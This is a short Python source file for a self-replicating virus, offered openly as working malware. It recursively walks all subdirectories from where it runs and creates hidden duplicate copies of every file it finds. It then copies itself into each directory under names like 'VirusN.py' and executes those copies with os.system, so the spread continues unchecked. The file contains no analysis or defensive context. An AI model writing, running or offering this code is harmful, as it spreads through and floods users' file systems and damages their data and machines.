import os
import shutil 
import random

 
class Virus:
    
    def __init__(self, path=None, target_dir=None, repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 2
        self.own_path = os.path.realpath(__file__)
        

        
    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir = os.listdir(path)
        
        for file in current_dir:
            if not file.startswith('.'):
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass

   
    def new_virus(self):
        for directory in self.target_dir:
            n = random.randint(0,10)
            new_script="Virus"+str(n)+".py"
            destination = os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination)
            os.system(new_script + " 1")
  
    def replicate(self):
        for directory in self.target_dir:
            file_list_in_dir=os.listdir(directory)
            for file in file_list_in_dir:
                abspath=os.path.join(directory,file)
                if not abspath.startswith(".")and not os.path.isdir(abspath):
                    source=abspath
                    for i in range (self.repeat):
                        destination=os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source,destination)

      
                        
    def Virus_action(self):
        self.list_directories(self.path)
        print(self.target_dir)
        self.replicate()
        self.new_virus()

      
        
        
                        
if __name__=="__main__":
    current_directory = os.path.abspath("")
    Virus = Virus(path=current_directory)
    Virus.Virus_action()
